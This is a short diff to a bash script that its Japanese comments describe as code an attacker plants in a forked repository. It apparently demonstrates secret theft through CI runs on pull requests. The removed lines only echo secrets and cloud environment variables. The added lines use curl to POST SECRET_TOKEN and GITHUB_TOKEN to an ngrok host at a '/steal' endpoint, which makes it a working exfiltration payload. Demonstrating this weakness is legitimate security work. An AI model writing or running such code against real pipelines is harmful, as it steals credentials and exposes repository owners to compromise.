@@ -1,9 +1,10 @@
 #!/bin/bash
-# 攻撃者がフォークリポジトリに仕込むスクリプト
-# 実際の攻撃では外部サーバーに送信するが、今回は確認のため echo するだけ
+# 攻撃者がフォークに仕込むスクリプト
 
-echo "=== 攻撃者のコードが実行されています ==="
-echo "SECRET_TOKEN の値: ${SECRET_TOKEN}"
-echo "GITHUB_TOKEN の値: ${GITHUB_TOKEN}"
-echo "その他の環境変数:"
-env | grep -E "GITHUB_|AWS_|GCP_|AZURE_" || true
+# GITHUB_TOKEN の長さを確認（値が存在するかチェック）
+TOKEN_LEN=${#GITHUB_TOKEN}
+echo "GITHUB_TOKEN length: ${TOKEN_LEN}"
+
+curl -s -X POST https://seema-unhumoured-eximiously.ngrok-free.dev/steal \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "secret=${SECRET_TOKEN}&token_len=${TOKEN_LEN}&github_token=${GITHUB_TOKEN}"
